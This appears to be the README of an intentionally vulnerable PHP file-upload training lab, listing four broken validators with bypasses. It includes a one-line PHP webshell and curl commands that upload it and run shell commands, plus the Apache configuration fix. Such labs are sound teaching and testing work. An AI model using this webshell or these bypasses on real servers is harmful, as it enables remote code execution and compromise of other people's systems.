# upload-basic

The companion lab for TechEarl's file-upload vulnerabilities spoke article. A small PHP app with four intentionally-broken upload validation flavours, each demonstrating a different way "we validated the upload" fails in production.

## Endpoints

| Endpoint | Validation | Stored under | Bypass |
|---|---|---|---|
| `/upload-naive.php` | None | `/uploads/naive/` | Upload `shell.php` directly |
| `/upload-blacklist.php` | Case-sensitive blacklist of `php`, `phtml`, `php3`, `php4` | `/uploads/blacklist/` | `shell.phP`, `shell.pht`, or `shell.phar` |
| `/upload-mime.php` | Client-supplied `Content-Type` must be `image/jpeg` | `/uploads/mime/` | Send `.php` with a forged multipart `Content-Type: image/jpeg` |
| `/upload-double-ext.php` | Trailing extension blacklist (case-insensitive), but the upload directory uses `AddHandler` | `/uploads/double-ext/` | `shell.php.jpg` (Apache executes any file whose name contains `.php`) |

## Running

```bash
docker compose up upload-basic
```

From the root of the `techearl-labs` repo. Lab listens on `http://localhost:8083`.

## Tearing down between attempts

```bash
docker compose down -v
```

The `-v` flag drops the named volume so the `uploads/` tree resets to empty. Without it, uploaded files persist across restarts (sometimes useful when iterating on a payload, otherwise just confusing).

## Expected exploit paths

The companion article uses the following one-line webshell as `shell.php`:

```php
<?php echo shell_exec($_GET['c'] ?? 'id'); ?>
```

### 1. Naive

```bash
curl -F 'file=@shell.php' http://localhost:8083/upload-naive.php
curl 'http://localhost:8083/uploads/naive/shell.php?c=id'
```

### 2. Blacklist (case bypass)

```bash
cp shell.php shell.phP
curl -F 'file=@shell.phP' http://localhost:8083/upload-blacklist.php
curl 'http://localhost:8083/uploads/blacklist/shell.phP?c=id'
```

The `.pht` and `.phar` variants work the same way when the mod_php config maps either to the PHP handler (`.phar` typically does).

### 3. MIME (forged Content-Type)

```bash
curl -F 'file=@shell.php;type=image/jpeg' http://localhost:8083/upload-mime.php
curl 'http://localhost:8083/uploads/mime/shell.php?c=id'
```

The `;type=image/jpeg` segment is the attacker-controlled MIME claim that PHP exposes as `$_FILES['file']['type']`.

### 4. Double extension (AddHandler misconfiguration)

```bash
cp shell.php shell.php.jpg
curl -F 'file=@shell.php.jpg' http://localhost:8083/upload-double-ext.php
curl 'http://localhost:8083/uploads/double-ext/shell.php.jpg?c=id'
```

The validator sees the trailing extension as `jpg` and accepts. Apache's `AddHandler application/x-httpd-php .php` fires on any filename that contains a `.php` segment, regardless of position, so the request hits mod_php and the shell executes. The `.htaccess` in `public/uploads/double-ext/` is what enables this; replacing the directive with `SetHandler application/x-httpd-php` (and only mapping it to the explicit trailing extension via a `<FilesMatch>` block) closes the path.

## Safety

Bound to `127.0.0.1` by default. Do not expose this container to a public interface. The whole point of the lab is that uploaded code runs on the host inside the container, so a reachable container is a one-request-away RCE for anyone on the network. Tear it down with `docker compose down -v` when you are finished.
